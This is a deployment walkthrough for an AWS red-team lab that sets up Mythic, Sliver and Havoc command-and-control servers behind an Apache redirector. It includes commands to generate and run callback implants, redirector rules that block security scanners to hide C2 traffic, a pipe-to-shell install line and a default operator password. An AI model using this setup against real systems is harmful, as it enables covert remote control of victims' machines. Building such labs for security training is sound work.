@@ -1,0 +1,1313 @@
+# RedStack: Boot-to-Breach
+
+## Complete Deployment Walkthrough
+
+**Purpose:** Step-by-step guide to deploy and verify your boot-to-breach lab environment
+**Difficulty:** Intermediate
+
+---
+
+## Table of Contents
+
+- [Architecture Overview](#architecture-overview)
+- [Pre-Deployment Checklist](#pre-deployment-checklist)
+- [Part 1: Initial Deployment](#part-1-initial-deployment)
+- [Part 2: Verification](#part-2-verification)
+- [Part 3: Apache Redirector Configuration](#part-3-apache-redirector-configuration)
+- [Part 4: Mythic C2 Setup](#part-4-mythic-c2-setup)
+- [Part 5: Sliver C2 Setup](#part-5-sliver-c2-setup)
+- [Part 6: Havoc C2 Setup](#part-6-havoc-c2-setup)
+- [Part 7: Final Validation](#part-7-final-validation)
+- [Troubleshooting](#troubleshooting)
+
+---
+
+## Architecture Overview
+
+```bash
+╔═══════════════════════════════════════════════════════════════════════╗
+║                       NETWORK ARCHITECTURE                          ║
+╚═══════════════════════════════════════════════════════════════════════╝
+
+VPC A - Team Server Infrastructure (10.50.0.0/16 or Default VPC)
+├── Mythic Team Server     (Elastic IP - public facing)
+├── Sliver C2 Server       (internal only - no public IP)
+├── Havoc C2 Server        (internal only - no public IP)
+├── Guacamole Server       (Elastic IP - public facing)
+└── Windows 11 Workstation (internal only - RDP via Guacamole)
+
+VPC B - Redirector Infrastructure (10.60.0.0/16)
+└── Apache Redirector         (Elastic IP - public facing)
+
+VPC Peering: VPC A ←→ VPC B
+
+Traffic Flow (URI Prefix Routing - all on ports 80/443):
+[Target] → /news/    → Redirector → Mythic
+[Target] → /images/  → Redirector → Sliver
+[Target] → /api/     → Redirector → Havoc
+
+Security Posture:
+✓ C2 servers ONLY accept traffic from Redirector VPC (10.60.0.0/16)
+✓ Sliver/Havoc have NO public IPs (internal only)
+✓ Redirector in separate VPC (simulates external provider isolation)
+✓ Windows workstation isolated (RDP only from Guacamole)
+```
+
+> **Tip:** After deployment, run `terraform output network_architecture` to see this diagram populated with your actual IP addresses.
+
+---
+
+## Pre-Deployment Checklist
+
+### Prerequisites
+
+- [ ] AWS account with IAM credentials
+- [ ] AWS CLI installed and configured
+- [ ] Terraform >= 1.0 installed
+- [ ] Your public IP obtained
+- [ ] SSH key pair created in AWS EC2 (see Step 0.3 below)
+- [ ] redstack_tf package extracted
+
+### Step 0.1: Install AWS CLI & Terraform
+
+**Install AWS CLI:**
+
+| Platform | Command |
+| -------- | ------- |
+| macOS | `brew install awscli` |
+| Linux (Ubuntu/Debian) | `sudo apt install awscli` |
+| Linux (any) | `curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" && unzip awscliv2.zip && sudo ./aws/install` |
+| Windows | Download and run the MSI installer from <https://aws.amazon.com/cli/> |
+
+**Configure AWS CLI:**
+
+```bash
+aws configure
+```
+
+You will be prompted for:
+
+- **AWS Access Key ID** - from IAM Console → Users → Security credentials
+- **AWS Secret Access Key** - shown once when creating the access key
+- **Default region name** - `us-east-1` (or your preferred region)
+- **Default output format** - `json`
+
+> **Note:** If you don't have an access key yet, create one in the AWS Console:
+> IAM → Users → [your user] → Security credentials → Create access key → CLI use case
+
+**Install Terraform:**
+
+| Platform | Command |
+| -------- | ------- |
+| macOS | `brew install terraform` |
+| Linux (Ubuntu/Debian) | See <https://developer.hashicorp.com/terraform/install> |
+| Windows | `choco install terraform` or download from <https://developer.hashicorp.com/terraform/install> |
+
+**Checkpoint:** ✅ AWS CLI and Terraform installed
+
+### Step 0.2: Verification Commands
+
+```bash
+# Check AWS access
+aws sts get-caller-identity
+
+# Check Terraform
+terraform --version
+
+# Get your public IP
+curl ifconfig.me
+```
+
+**Expected Results:**
+
+- AWS CLI returns your account details (Account, Arn, UserId)
+- Terraform version 1.0 or higher
+- Public IP address displayed
+
+**Checkpoint:** ✅ AWS CLI and Terraform working, public IP noted
+
+### Step 0.3: Create AWS SSH Key Pair (Required)
+
+**Terraform does NOT create the SSH key pair - you must create it manually first.**
+
+### Option 1: AWS Console (Recommended)
+
+1. Open AWS Console → EC2 → Key Pairs
+2. Click "Create key pair"
+3. Name: `rs-rsa-key` (or your preferred name)
+4. Key type: RSA
+5. File format: `.pem` (for Linux/Mac) or `.ppk` (for PuTTY)
+6. Click "Create key pair"
+7. **Save the downloaded .pem file** - you cannot download it again!
+8. Move to project folder: `mv ~/Downloads/rs-rsa-key.pem ./`
+9. Set permissions: `chmod 400 ./rs-rsa-key.pem`
+
+### Option 2: AWS CLI
+
+```bash
+# Create key pair and save to project folder
+aws ec2 create-key-pair --key-name rs-rsa-key --query 'KeyMaterial' --output text > ./rs-rsa-key.pem
+
+# Set correct permissions
+chmod 400 ./rs-rsa-key.pem
+```
+
+**Verify key pair exists:**
+
+```bash
+aws ec2 describe-key-pairs --key-names rs-rsa-key
+```
+
+**Checkpoint:** ✅ SSH key pair created and .pem file saved
+
+---
+
+## Part 1: Initial Deployment
+
+### Objective: AWS Infrastructure Deployment
+
+Deploy all AWS infrastructure using Terraform: VPCs, security groups, EC2 instances (Mythic, Sliver, Havoc, Guacamole, Windows, Apache redirector).
+
+### Step 1.1: Configure Terraform Variables
+
+```bash
+cd redstack_tf
+cp terraform.tfvars.example terraform.tfvars
+nano terraform.tfvars
+```
+
+**Required Changes:**
+
+```hcl
+localPub_ip              = "YOUR_IP/32"           # Replace with your IP + /32
+ssh_key_name             = "rs-rsa-key"            # Must match your AWS key pair name
+redirector_domain        = "c2.yourdomain.com"    # Your domain for the redirector
+```
+
+**Note:** Passwords are auto-generated during deployment. A single random password is used for all instances (SSH, Guacamole admin, Windows attacker user). Retrieve it after deployment with:
+
+```bash
+terraform output lab_password
+```
+
+**Checkpoint:** ✅ File saved with your actual values
+
+### Step 1.2: Initialize Terraform
+
+```bash
+terraform init
+```
+
+**Expected Output:**
+
+```bash
+Initializing the backend...
+Initializing provider plugins...
+- Finding hashicorp/aws versions matching "~> 5.0"...
+- Installing hashicorp/aws v5.x.x...
+Terraform has been successfully initialized!
+```
+
+**Checkpoint:** ✅ No errors, providers downloaded
+
+### Step 1.3: Review Deployment Plan
+
+```bash
+terraform plan
+```
+
+**Expected Output:**
+
+- **~50+ resources** to be created
+- 6 EC2 instances (Mythic, Sliver, Havoc, Guacamole, Windows, Redirector)
+- 2 VPCs (team server VPC + redirector VPC)
+- 3 Elastic IPs (Mythic, Guacamole, Redirector) - **all static, persistent IPs**
+- Sliver and Havoc have **no public IPs** (internal only)
+- Security groups, VPC peering, route tables
+- No errors or warnings
+
+**Checkpoint:** ✅ Plan shows expected resources
+
+### Step 1.4: Deploy Infrastructure
+
+```bash
+terraform apply
+```
+
+Type `yes` when prompted.
+
+**Expected Output:**
+
+```bash
+Apply complete! Resources: 50+ added, 0 changed, 0 destroyed.
+```
+
+**Checkpoint:** ✅ Terraform apply completed successfully
+
+### Step 1.5: Save Deployment Information
+
+```bash
+terraform output > deployment_info.txt
+terraform output network_architecture
+```
+
+**Checkpoint:** ✅ Output saved, network diagram displayed
+
+### Step 1.6: Point Domain to Redirector
+
+After deployment, you need to point your domain's DNS to the redirector's Elastic IP so that Certbot can obtain a valid SSL certificate.
+
+**Get the Redirector IP:**
+
+```bash
+terraform output -json vps_redirector | jq -r '.public_ip'
+```
+
+**Create a DNS A Record:**
+
+1. Log into your domain registrar or DNS provider (e.g., Namecheap, Cloudflare, Route53)
+2. Navigate to DNS settings for your domain
+3. Create an **A record**:
+   - **Host/Name:** The subdomain portion (e.g., `c2` if your domain is `c2.yourdomain.com`)
+   - **Value/Points to:** The redirector's Elastic IP from the command above
+   - **TTL:** 300 (5 minutes) or lowest available
+
+**Verify DNS Propagation:**
+
+```bash
+# Check if the domain resolves to the redirector IP
+nslookup c2.yourdomain.com
+# or
+dig +short c2.yourdomain.com
+```
+
+**Expected:** The IP returned should match your redirector's Elastic IP.
+
+> **Note:** DNS propagation can vary. After DNS resolves correctly, run Certbot on the redirector (see Step 2.4):
+>
+> ```bash
+> sudo certbot --apache -d c2.yourdomain.com
+> ```
+
+**Checkpoint:** ✅ Domain pointed to redirector IP, DNS verified
+
+### Wait Time: 5-10 Minutes
+
+**Why:** User data scripts are installing software on multiple servers
+
+**What's Happening:**
+
+- Mythic: Installing Docker, cloning Mythic, starting ~10 containers
+- Sliver: Installing Sliver C2 server binary, configuring firewall
+- Havoc: Installing Go, cloning and building Havoc teamserver from source
+- Guacamole: Setting up PostgreSQL, Nginx, Docker containers
+- Windows: Disabling Defender/Firewall, enabling RDP, installing WSL Debian and Windows Terminal
+- Redirector: Configuring SSH access only (Apache setup is manual — see Step 2.4)
+
+---
+
+## Part 2: Verification
+
+### Objective: Component Verification
+
+Verify all six components are operational and accessible.
+
+### Step 2.1: Verify Mythic Team Server
+
+**Get Connection Info:**
+
+```bash
+terraform output mythic_server
+```
+
+**SSH to Mythic:**
+
+```bash
+MYTHIC_IP=$(terraform output -json mythic_server | jq -r '.public_ip')
+ssh -i your-key.pem admin@$MYTHIC_IP
+```
+
+**Check Mythic Status:**
+
+```bash
+cd /opt/Mythic
+sudo ./mythic-cli status
+```
+
+**Expected Output:**
+
+```bash
+Mythic Main Server: Running (port 7443)
+Mythic Postgres: Running
+Mythic RabbitMQ: Running
+Mythic Documentation: Running
+...
+[Total: 10-12 containers running]
+```
+
+**Get Admin Password:**
+
+```bash
+sudo cat .env | grep MYTHIC_ADMIN_PASSWORD
+```
+
+**Checkpoint:** ✅ 10+ containers running, password obtained
+
+**Access Web UI:**
+
+```bash
+exit  # Exit SSH
+echo "https://$MYTHIC_IP:7443"
+# Open in browser (accept self-signed cert warning)
+```
+
+- Login: `mythic_admin`
+- Password: [from above command]
+
+**Checkpoint:** ✅ Mythic UI accessible, can login
+
+### Step 2.2: Verify Guacamole Access Portal
+
+**Get Connection Info:**
+
+```bash
+GUAC_IP=$(terraform output -json guacamole_server | jq -r '.public_ip')
+```
+
+**SSH to Guacamole:**
+
+```bash
+ssh -i your-key.pem ubuntu@$GUAC_IP
+```
+
+**Check Docker Containers:**
+
+```bash
+docker ps
+```
+
+**Expected Output:**
+
+```bash
+CONTAINER ID   IMAGE                   STATUS
+xxxxx          guacamole/guacamole     Up X minutes
+xxxxx          postgres:15             Up X minutes
+xxxxx          guacamole/guacd         Up X minutes
+```
+
+**Checkpoint:** ✅ 3 containers running
+
+```bash
+exit  # Exit SSH
+```
+
+**Access Guacamole UI:**
+
+```bash
+echo "https://$GUAC_IP/guacamole"
+# Open in browser
+```
+
+**Login Credentials:**
+
+- Username: `guacadmin`
+- Password: run `terraform output lab_password`
+
+**Checkpoint:** ✅ Guacamole UI accessible, can login
+
+**Verify Auto-Created Connections:**
+
+After logging in, you should see **6 pre-configured connections**:
+
+1. **Windows 11 Attacker Workstation** (RDP) - prompts for password on connect
+2. **Mythic Team Server (SSH)** - gray-black terminal theme
+3. **Guacamole Server (SSH)** - green-black terminal theme
+4. **Apache Redirector (SSH)** - solarized terminal theme
+5. **Sliver C2 Server (SSH)** - white-black terminal theme
+6. **Havoc C2 Server (SSH)** - black-white terminal theme
+
+All SSH connections use password authentication (no SSH keys needed) and are pre-configured with the auto-generated lab password. The Windows RDP connection uses the `attacker` user with the same lab password.
+
+**Checkpoint:** ✅ All 6 connections visible in Guacamole UI
+
+### Step 2.3: Verify Windows Attacker Workstation
+
+The Windows instance has an `attacker` user pre-created with the auto-generated lab password.
+
+**Access via Guacamole:**
+
+1. Open Guacamole UI
+2. Click **"Windows 11 Attacker Workstation"**
+3. When prompted, log in as `attacker` with the lab password (`terraform output lab_password`)
+4. Wait 10-30 seconds for RDP connection
+
+**Expected:**
+
+- Windows desktop loads
+- Logged in as `attacker` (local admin)
+- Windows Terminal is installed (check Start Menu)
+- WSL with Debian is available (a reboot may be required to finalize WSL)
+
+**Verify WSL (after reboot if needed):**
+
+```powershell
+wsl -l -v
+```
+
+Should show `Debian` listed as an installed distribution.
+
+**Checkpoint:** ✅ Can RDP into Windows via Guacamole, Windows Terminal and WSL available
+
+**If Connection Fails:**
+
+- Wait 5 more minutes (Windows setup is slowest)
+- Check instance state: `aws ec2 describe-instances --instance-ids $(terraform output -json windows_client | jq -r '.instance_id') --query 'Reservations[0].Instances[0].State.Name'`
+- Should show `"running"`
+
+### Step 2.4: Verify Apache Redirector
+
+**Get Connection Info:**
+
+```bash
+REDIR_IP=$(terraform output -json vps_redirector | jq -r '.public_ip')
+```
+
+**SSH to Redirector (via Guacamole or direct SSH):**
+
+```bash
+ssh -i your-key.pem ubuntu@$REDIR_IP
+```
+
+**Run the Redirector Setup Script:**
+
+The redirector deploys with only SSH access configured. You must run the setup script manually to install Apache and configure proxying:
+
+```bash
+sudo /root/setup_redirector.sh
+```
+
+This installs:
+
+- Apache2 with modules: rewrite, ssl, proxy, proxy_http, headers, deflate, proxy_balancer, proxy_html
+- Certbot for Let's Encrypt SSL
+- OpenJDK 17
+- UFW firewall (ports 22, 80, 443)
+- Self-signed SSL certificate (placeholder for Certbot)
+- Consolidated VirtualHost configs with URI prefix routing
+
+**URI Routing (configured automatically, all on ports 80/443):**
+
+| URI Prefix | Backend C2 Server |
+| ---------- | ----------------- |
+| /news/ | Mythic |
+| /images/ | Sliver |
+| /api/ | Havoc |
+
+**Run Connectivity Test (after setup):**
+
+```bash
+sudo /root/test_redirector.sh
+```
+
+**Expected Output:**
+
+```bash
+===== Redirector Connectivity Test =====
+Apache: Active: active (running)
+Active VirtualHosts: 2 configured
+Testing connectivity to Mythic: HTTP response received
+Testing connectivity to Sliver: ...
+Testing connectivity to Havoc: ...
+```
+
+**Checkpoint:** ✅ Apache running, URI prefix routing configured for all 3 C2 servers
+
+**Obtain SSL Certificate (after DNS is pointed):**
+
+```bash
+sudo certbot --apache -d c2.yourdomain.com
+```
+
+```bash
+exit  # Exit SSH
+```
+
+### Step 2.5: Verify Sliver C2 Server
+
+**Access via Guacamole:**
+
+1. Open Guacamole UI
+2. Click **"Sliver C2 Server (SSH)"**
+3. Should connect automatically
+
+**Or via SSH from the redirector:**
+
+```bash
+ssh -i your-key.pem ubuntu@$REDIR_IP
+SLIVER_IP=$(terraform output -json sliver_server | jq -r '.private_ip')
+ssh ubuntu@$SLIVER_IP
+```
+
+**Run Quick Start:**
+
+```bash
+sudo /root/sliver_quickstart.sh
+```
+
+**Verify Sliver is installed:**
+
+```bash
+which sliver-server
+```
+
+**Checkpoint:** ✅ Sliver C2 server installed, accessible via Guacamole
+
+### Step 2.6: Verify Havoc C2 Server
+
+**Access via Guacamole:**
+
+1. Open Guacamole UI
+2. Click **"Havoc C2 Server (SSH)"**
+3. Should connect automatically
+
+**Run Quick Start:**
+
+```bash
+sudo /root/havoc_quickstart.sh
+```
+
+**Start the Havoc Teamserver:**
+
+```bash
+sudo systemctl start havoc
+sudo systemctl status havoc
+```
+
+**Checkpoint:** ✅ Havoc C2 teamserver running, accessible via Guacamole
+
+### Step 2.7: Verify SSH Connections via Guacamole
+
+**Test SSH Access:**
+
+1. Open Guacamole UI
+2. Click **"Mythic Team Server (SSH)"**
+3. Should connect without prompting for credentials
+4. Run: `whoami` → Should show `admin`
+5. Disconnect
+
+**Repeat for:**
+
+- **"Guacamole Server (SSH)"** → `whoami` should show `ubuntu`
+- **"Apache Redirector (SSH)"** → `whoami` should show `ubuntu`
+- **"Sliver C2 Server (SSH)"** → `whoami` should show `ubuntu`
+- **"Havoc C2 Server (SSH)"** → `whoami` should show `ubuntu`
+
+**Checkpoint:** ✅ All SSH connections work via Guacamole
+
+**Verify SSH Security:**
+
+All Linux servers are configured with dual SSH authentication:
+
+- **From Public IPs:** SSH keys REQUIRED (password authentication disabled)
+- **From VPC IPs (10.50.0.0/16, 172.31.0.0/16):** Password authentication ALLOWED
+
+This means:
+
+- ✅ Guacamole can SSH with passwords (it's in the VPC)
+- ✅ Your SSH key still works from your public IP
+- ❌ Random internet users cannot brute-force SSH passwords
+
+**Checkpoint:** ✅ Understand SSH security model
+
+---
+
+## Part 3: Apache Redirector Configuration
+
+### Objective: Redirector URI Routing and Filtering
+
+Understand the Apache redirector URI prefix routing and add custom mod_rewrite filtering rules.
+
+### Step 3.1: Review Configuration
+
+**SSH to redirector:**
+
+```bash
+ssh -i your-key.pem ubuntu@$REDIR_IP
+```
+
+**View URI Routing:**
+
+```bash
+sudo apache2ctl -S
+```
+
+This shows all configured VirtualHosts (HTTP and HTTPS on ports 80/443).
+
+**View HTTP Config (all C2 routes in one file):**
+
+```bash
+sudo cat /etc/apache2/sites-available/redirector-http.conf
+```
+
+**View HTTPS Config:**
+
+```bash
+sudo cat /etc/apache2/sites-available/redirector-https.conf
+```
+
+Each VirtualHost uses `ProxyPass` with URI prefixes to route traffic to the correct C2 server. The prefix is stripped before forwarding (e.g., `/news/callback` arrives at Mythic as `/callback`).
+
+**Checkpoint:** ✅ Understand URI prefix routing and proxy configuration
+
+### Step 3.2: Add Filtering Rules (Optional)
+
+The default configuration forwards all traffic without filtering. You can add mod_rewrite rules to each VirtualHost to filter by user-agent, URI path, or other criteria.
+
+**Example: Add scanner blocking to Mythic's HTTP config:**
+
+```bash
+sudo nano /etc/apache2/sites-available/redirector-http.conf
+```
+
+Add before the `ProxyPass` directive:
+
+```apache
+# Block scanner user-agents
+RewriteCond %{HTTP_USER_AGENT} "(?i)(nmap|nikto|masscan|burp|sqlmap)" [NC]
+RewriteRule ^.*$ - [F,L]
+
+# Require /api/ URI pattern
+RewriteCond %{REQUEST_URI} !^/api/
+RewriteRule ^.*$ - [F,L]
+```
+
+**Test Configuration:**
+
+```bash
+sudo apache2ctl configtest
+```
+
+**Reload Apache:**
+
+```bash
+sudo systemctl reload apache2
+```
+
+**Test Filtering:**
+
+```bash
+exit
+
+# Should be BLOCKED (403) - no /api/ path
+curl -v http://$REDIR_IP/
+
+# Should be BLOCKED (403) - scanner UA
+curl -v -A "Nmap" http://$REDIR_IP/api/test
+
+# Should be FORWARDED - valid request
+curl -v -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://$REDIR_IP/api/test
+```
+
+**Checkpoint:** ✅ Filtering rules working (if applied)
+
+### Step 3.3: Review Logs
+
+Each C2 has its own log files:
+
+```bash
+ssh -i your-key.pem ubuntu@$REDIR_IP
+
+# Mythic logs
+sudo tail -50 /var/log/apache2/redirector-access.log
+sudo tail -50 /var/log/apache2/redirector-error.log
+
+# Sliver logs
+sudo tail -50 /var/log/apache2/sliver-access.log
+sudo tail -50 /var/log/apache2/sliver-error.log
+
+# Havoc logs
+sudo tail -50 /var/log/apache2/havoc-access.log
+sudo tail -50 /var/log/apache2/havoc-error.log
+```
+
+**Checkpoint:** ✅ Redirector logging understood
+
+---
+
+## Part 4: Mythic C2 Setup
+
+### Objective: Mythic Listener and Agent Generation
+
+Configure Mythic HTTP listener and generate test agent.
+
+### Step 4.1: Create HTTP Listener
+
+**Access Mythic UI:**
+
+```bash
+https://$MYTHIC_IP:7443
+```
+
+**Navigate:** C2 Profiles → HTTP
+
+**Click:** "New Listener"
+
+**Configuration:**
+
+| Setting | Value |
+| ------- | ----- |
+| Callback Host | `REDIR_IP` (your redirector public IP) |
+| Callback Port | `80` |
+| Callback Interval | `10` |
+| Callback Jitter | `20` |
+| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64)` |
+| GET URI | `/api/status` |
+| POST URI | `/api/update` |
+
+**Click:** "Submit" then "Start"
+
+**Checkpoint:** ✅ Listener shows "Running"
+
+### Step 4.2: Generate Agent
+
+**Navigate:** Payloads → Generate New
+
+**Configuration:**
+
+| Setting | Value |
+| ------- | ----- |
+| Agent | `Apollo` |
+| C2 Profile | Select your HTTP listener |
+| Commands | Select: `shell`, `download`, `upload`, `screenshot` |
+| Operating System | `Windows` |
+| Output Format | `Windows Executable (.exe)` |
+
+**Click:** "Generate"
+
+**Wait:** 30-60 seconds
+
+**Download:** Click "Download" button
+
+**Checkpoint:** ✅ Agent downloaded (filename like `apollo.exe`)
+
+### Step 4.3: Deploy Agent
+
+**Access Windows Workstation:**
+
+1. Open Guacamole UI
+2. Click "Windows 11 Attacker Workstation"
+3. Use file transfer to upload `apollo.exe`
+
+**Or use Guacamole's file share:**
+
+- Left sidebar → Devices → Shared Drive
+- Copy agent to shared folder
+
+**Execute Agent:**
+
+```powershell
+cd Downloads  # Or wherever you uploaded
+.\apollo.exe
+```
+
+**Watch Mythic UI:**
+
+- Navigate to: Active Callbacks
+- Should see new callback appear within ~10 seconds
+
+**Expected:**
+
+```bash
+Hostname: WIN-XXXXXXX
+User: Administrator
+IP: 172.31.X.X
+```
+
+**Checkpoint:** ✅ Agent callback received
+
+### Step 4.4: Test C2 Session
+
+### In Mythic, click the callback
+
+**Test Commands:**
+
+```bash
+Task: shell
+Command: whoami
+```
+
+**Expected Output:** `win-xxxxxxx\administrator`
+
+**Verify Redirector Traffic:**
+
+```bash
+ssh ubuntu@$REDIR_IP
+sudo tail -f /var/log/apache2/redirector-access.log
+```
+
+**Look for:** Regular GET/POST requests to `/api/status` and `/api/update`
+
+**Checkpoint:** ✅ C2 traffic flowing through redirector to Mythic
+
+---
+
+## Part 5: Sliver C2 Setup
+
+### Objective: Sliver Operator and Listener Setup
+
+Configure Sliver C2 server, generate an operator config, and create a listener.
+
+### Step 5.1: Access Sliver Server
+
+**Via Guacamole:** Click **"Sliver C2 Server (SSH)"**
+
+**Or via SSH:**
+
+```bash
+SLIVER_IP=$(terraform output -json sliver_server | jq -r '.private_ip')
+ssh -i your-key.pem ubuntu@$REDIR_IP  # Jump through redirector
+ssh ubuntu@$SLIVER_IP
+```
+
+### Step 5.2: Generate Operator Config
+
+```bash
+sudo /root/generate_operator_config.sh operator1
+```
+
+This creates `/root/operator1.cfg` — transfer this file to your machine to connect using the Sliver client.
+
+**Checkpoint:** ✅ Operator config generated
+
+### Step 5.3: Start Sliver Console and Create Listener
+
+```bash
+sliver-server
+```
+
+**In the Sliver console:**
+
+```bash
+sliver > http --lhost 0.0.0.0 --lport 80
+```
+
+This starts an HTTP listener on port 80. The redirector forwards traffic from the `/images/` URI prefix to this listener.
+
+**Checkpoint:** ✅ Sliver HTTP listener running
+
+### Step 5.4: Generate Implant
+
+**In the Sliver console:**
+
+```bash
+sliver > generate --http https://REDIR_DOMAIN/images/ --os windows --arch amd64 --format exe --save /tmp/implant.exe
+```
+
+Replace `REDIR_DOMAIN` with your redirector's domain (e.g., `c2.yourdomain.com`). The `/images/` prefix is stripped by the redirector before forwarding to Sliver.
+
+Transfer the implant to the Windows workstation and execute it. You should see a new session appear in the Sliver console.
+
+**Checkpoint:** ✅ Sliver implant calling back through redirector
+
+### Step 5.5: Test Sliver Session
+
+```bash
+sliver > sessions
+
+sliver > use [SESSION_ID]
+
+sliver (SESSION) > whoami
+sliver (SESSION) > pwd
+```
+
+**Verify Redirector Traffic:**
+
+```bash
+sudo tail -f /var/log/apache2/redirector-access.log
+```
+
+**Checkpoint:** ✅ Sliver C2 operational through redirector URI prefix /images/
+
+---
+
+## Part 6: Havoc C2 Setup
+
+### Objective: Havoc Teamserver Configuration
+
+Configure Havoc C2 teamserver and connect with the Havoc client.
+
+### Step 6.1: Start Havoc Teamserver
+
+**Via Guacamole:** Click **"Havoc C2 Server (SSH)"**
+
+```bash
+sudo systemctl start havoc
+sudo systemctl status havoc
+```
+
+The teamserver starts on port 40056 with the default profile at `/opt/Havoc/profiles/default.yaotl`.
+
+**Default Operator Credentials:**
+
+- Username: `operator`
+- Password: `Training123!`
+
+**Checkpoint:** ✅ Havoc teamserver running on port 40056
+
+### Step 6.2: Connect Havoc Client
+
+The Havoc client is a Qt-based GUI application that runs on the Windows attacker workstation.
+
+**From the Windows Attacker Workstation:**
+
+1. Download the Havoc client from the [Havoc GitHub releases](https://github.com/HavocFramework/Havoc)
+2. Connect to the teamserver:
+   - **Host:** Havoc server private IP (from `terraform output -json havoc_server | jq -r '.private_ip'`)
+   - **Port:** 40056
+   - **Username:** operator
+   - **Password:** Training123!
+
+**Checkpoint:** ✅ Havoc client connected to teamserver
+
+### Step 6.3: Create Listener and Generate Demon
+
+**In the Havoc client:**
+
+1. Navigate to: Listeners → Add
+2. The default profile already includes an HTTP listener on port 80
+3. The redirector forwards traffic from the `/api/` URI prefix to this listener
+
+**Generate a Demon (Havoc implant):**
+
+1. Navigate to: Payloads → Generate
+2. Configure the callback host as `https://REDIR_DOMAIN/api/` (your redirector domain)
+3. Generate and transfer to the Windows workstation
+
+**Checkpoint:** ✅ Havoc Demon calling back through redirector URI prefix /api/
+
+---
+
+## Part 7: Final Validation
+
+### Objective: Complete Infrastructure Validation
+
+Verify complete infrastructure and security posture.
+
+### Step 7.1: Test Security Isolation
+
+**Critical Test - C2 Servers Should NOT Be Directly Accessible:**
+
+```bash
+# Mythic - should timeout
+curl -v -m 5 http://$MYTHIC_IP/
+
+# Sliver and Havoc have no public IPs at all - they are internal only
+```
+
+**Expected:** Connection timeout for Mythic. Sliver and Havoc are unreachable from the internet by design (no public IP, no Elastic IP).
+
+**Checkpoint:** ✅ C2 servers not directly accessible (GOOD!)
+
+**Verify Redirector CAN Reach All C2 Servers:**
+
+```bash
+ssh ubuntu@$REDIR_IP
+
+MYTHIC_PRIVATE=$(terraform output -json mythic_server | jq -r '.private_ip')
+SLIVER_PRIVATE=$(terraform output -json sliver_server | jq -r '.private_ip')
+HAVOC_PRIVATE=$(terraform output -json havoc_server | jq -r '.private_ip')
+
+curl -I http://$MYTHIC_PRIVATE/
+curl -I http://$SLIVER_PRIVATE/
+curl -I http://$HAVOC_PRIVATE/
+```
+
+**Expected:** HTTP response (200, 404, or connection refused if no listener is running yet)
+
+**Checkpoint:** ✅ Redirector can reach all C2 servers via private IPs
+
+### Step 7.2: Verify All Agent Callbacks
+
+**Check across all C2 frameworks:**
+
+- Mythic: Active Callbacks page in the web UI
+- Sliver: `sessions` command in the Sliver console
+- Havoc: Active sessions in the Havoc client
+
+**Checkpoint:** ✅ All C2 callback paths functional
+
+### Step 7.3: Review Redirector Logs
+
+**All C2 traffic flows through the redirector with separate logs:**
+
+```bash
+ssh ubuntu@$REDIR_IP
+
+# Mythic traffic (port 80/443)
+sudo tail -20 /var/log/apache2/redirector-access.log
+
+# All C2 traffic is in the same log (differentiate by URI prefix)
+# /news/ = Mythic, /images/ = Sliver, /api/ = Havoc
+```
+
+**Checkpoint:** ✅ Redirector logging understood for all C2 servers
+
+### Step 7.4: Document Deployment
+
+```bash
+cat > deployment_summary.txt <<EOF
+REDSTACK DEPLOYMENT COMPLETE
+========================
+Deployment Date: $(date)
+
+INFRASTRUCTURE (6 EC2 instances):
+- Mythic C2:    $MYTHIC_IP (public)
+- Sliver C2:    internal only (access via Guacamole)
+- Havoc C2:     internal only (access via Guacamole)
+- Guacamole:    $GUAC_IP (public)
+- Windows:      internal only (RDP via Guacamole)
+- Redirector:   $REDIR_IP (public)
+
+REDIRECTOR URI ROUTING (all on ports 80/443):
+- /news/   -> Mythic
+- /images/ -> Sliver
+- /api/    -> Havoc
+
+CREDENTIALS:
+- Lab Password: [run terraform output lab_password]
+- Mythic: mythic_admin / [check .env]
+- Guacamole: guacadmin / [lab password]
+- Windows: attacker / [lab password]
+- Havoc: operator / Training123!
+
+STATUS: All systems operational
+EOF
+
+cat deployment_summary.txt
+```
+
+**Checkpoint:** ✅ Deployment documented
+
+---
+
+## Troubleshooting
+
+### Guacamole Connections Not Auto-Created
+
+**Symptoms:** Some or all of the 6 connections don't appear in Guacamole UI after deployment
+
+**Root Cause:** Previous versions had a bug where the setup script used incorrect database backend ('mysql' instead of 'postgresql')
+
+**Solution:**
+
+```bash
+# SSH to Guacamole server
+ssh -i your-key.pem ubuntu@$GUAC_IP
+
+# Check if connections exist
+docker exec -it postgres_guacamole psql -U guacamole_user -d guacamole_db \
+  -c "SELECT connection_id, connection_name, protocol FROM guacamole_connection;"
+```
+
+**Expected:** Should show 6 connections (1 RDP, 5 SSH)
+
+**If Missing, Manually Create via Guacamole UI:**
+
+1. Log into Guacamole web UI
+2. Settings (top right) → Connections → New Connection
+
+**SSH Connections (for any missing C2 server):**
+
+- Name: `Sliver C2 Server (SSH)` or `Havoc C2 Server (SSH)`
+- Protocol: SSH
+- Hostname: [Private IP from terraform output]
+- Port: 22
+- Username: ubuntu
+- Password: [run `terraform output lab_password`]
+
+**Fixed in Current Version:** The setup script correctly creates all 6 connections automatically
+
+### Mythic Not Starting
+
+**Symptoms:** mythic-cli status shows containers not running
+
+**Solution:**
+
+```bash
+ssh admin@$MYTHIC_IP
+cd /opt/Mythic
+sudo ./mythic-cli logs  # Check for errors
+sudo ./mythic-cli restart
+```
+
+**Common Issues:**
+
+- Docker still pulling images (wait 5 min)
+- Port conflicts (check: `sudo netstat -tlnp`)
+- Memory issues (upgrade to t3.large)
+
+### Sliver Not Installed
+
+**Symptoms:** `sliver-server` command not found
+
+**Solution:**
+
+```bash
+# Check user-data log
+sudo cat /var/log/user-data.log
+
+# Re-run installation
+curl https://sliver.sh/install | sudo bash
+```
+
+### Havoc Build Failed
+
+**Symptoms:** Havoc teamserver binary not found or service fails to start
+
+**Solution:**
+
+```bash
+# Check user-data log
+sudo cat /var/log/user-data.log
+
+# Check Go installation
+/usr/local/go/bin/go version
+
+# Rebuild manually
+cd /opt/Havoc/teamserver
+sudo -E /usr/local/go/bin/go build -o teamserver .
+
+# Start manually to see errors
+./teamserver server --profile /opt/Havoc/profiles/default.yaotl
+```
+
+### Guacamole RDP Fails
+
+**Symptoms:** Can't connect to Windows via Guacamole
+
+**Solution:**
+
+```bash
+# Check Guacamole logs
+ssh ubuntu@$GUAC_IP
+docker logs guacamole
+
+# Test RDP connectivity
+WIN_IP=$(terraform output -json windows_client | jq -r '.private_ip')
+telnet $WIN_IP 3389
+```
+
+**Common Issues:**
